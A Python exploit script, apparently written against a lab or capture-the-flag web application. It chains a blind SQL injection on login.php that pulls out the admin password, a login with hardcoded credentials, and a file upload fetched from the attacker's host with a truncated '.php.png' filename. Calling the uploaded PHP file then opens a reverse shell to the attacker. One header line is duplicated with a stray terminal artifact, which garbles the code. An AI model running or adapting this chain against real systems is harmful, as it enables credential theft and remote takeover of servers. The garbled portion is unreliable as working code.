import sys                                                                                                                                  
import requests     
import re           
import subprocess          
                                   
exfilData = []                                                        
                                   
def checkSqli(ip, port, inj_str):                                                                                                           
    for values in range(32, 126):
        burp0_url = "http://%s:%d/login.php" % (ip, port)
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+ip, "Content-Type": "applicatio
n/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.7
4 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/si
gned-exchange;v=b3;q=0.9", "Referer": "http://"+ip+"/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "C
onnection": "close"} 
        burp0_data = "username="+inj_str.replace("[CHAR]", str(values))+"&password=test"
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        content_length = int(r.headers['Content-Length'])
        if content_length == 7091:
            return values                                                                                                                   
    return None                
                                                                      
def adminLogin(ip, port, discoveredPass):                     
    burp0_url = "http://%s:%d/login.php" % (ip, port)
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+ip, "Content-Type": "application/x-
www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Sa
fari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed
-exchange;v=b3;q=0.9", "Referer": "http://"+ip+"/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Conne
ction": "close"}
                     fari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applicatio[0/1735]-exchange;v=b3;q=0.9", "Referer": "http://"+ip+"/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Conne
ction": "close"}                                                                                                                            
    burp0_data = "username=Admin""&password="+ discoveredPass                                                                               
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)    
    roughAdminCookie = r.headers['Set-Cookie']                       
    finalAdminCookie = re.match("PHPSESSID\=(\w+)", roughAdminCookie)                                                                       
    return finalAdminCookie.group(1)     
                                                                                                                                            
def fileUpload(ip, port, attackerIp, attackerPort, phpSessionId):
    burp1_url = "http://%s:%d/upload.php" % (ip, port)                                                                                      
    burp1_cookies = {"PHPSESSID": phpSessionId}                                                                                             
    burp1_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+ip, "Content-Type": "application/x-
www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+ip+"/upload.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Conn
ection": "close"}                                                                                                                           
    burp1_data = {"url": "http://"+ attackerIp +":"+str(attackerPort)+"/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAA.php.png"}                                                                                                          
    r = requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data)                                             
    uploadLocation = re.match(".*cd\s\/var\/www\/html\/uploads\/(\d+\-\d+\_\w+)", str(r.content))
    return uploadLocation.group(1)                                    
                                                                      
def revShell(ip, port, attackerIp, attackerPort, phpSessionId):                                                                             
    uploadLocation = fileUpload(ip, port, attackerIp, attackerPort, phpSessionId)                                                           
    burp2_url = "http://%s:%d/uploads/%s/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php" %
 (ip, port, uploadLocation)                                           
    burp2_cookies = {"PHPSESSID": phpSessionId}                                                                                             
    burp2_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language":
 "en-US,en;q=0.9", "Connection": "close"}                                                                                                   
    r = requests.get(burp2_url, headers=burp2_headers, cookies=burp2_cookies)                                                               
    print("Check listening port on attacker machine for connection...")
                                   
def main():                                                           
    if len(sys.argv) != 5:                                                                                                                  
        print("[+] usage: %s <target> <targetport> <attackerIP> <attackerPort>" % sys.argv[0])
        sys.exit(-1)
    ip = sys.argv[1]       
    port = int(sys.argv[2])        
    attackerIp = sys.argv[3]                                          
    attackerPort = int(sys.argv[4]) 
    for each in range(1, 100):                                                                                                              
        injectionQuery = "a'%%20or%%20(ascii(substring((select%%20password%%20from%%20users%%20where%%20id%%20=%%20'1'),%d,1)))=[CHAR]%%23" 
% each                                                                
        try:                                                                                                                                
            exfilChar = chr(checkSqli(ip, port, injectionQuery))                                                                            
            sys.stdout.write(exfilChar)                                                                                                     
            exfilData.append(exfilChar)                                                                                                     
            sys.stdout.flush()
        except:                                                                                                                             
            print("\n[+] All Characters Found!")                                                                                            
            break                                                     
    #Supplying static credentials as admin password
    creds = 'aabC9RqS'                                                                                                                      
    print("Exfiltrated Admin user password hash: "+(''.join(map(str, exfilData))))                                       
    phpSessionId = adminLogin(ip, port, creds)                
    revShell(ip, port, attackerIp, attackerPort, phpSessionId)
    print("\n[+] Done!")                                                                                                                    
if __name__ == "__main__":                                                                                                                  
    main()
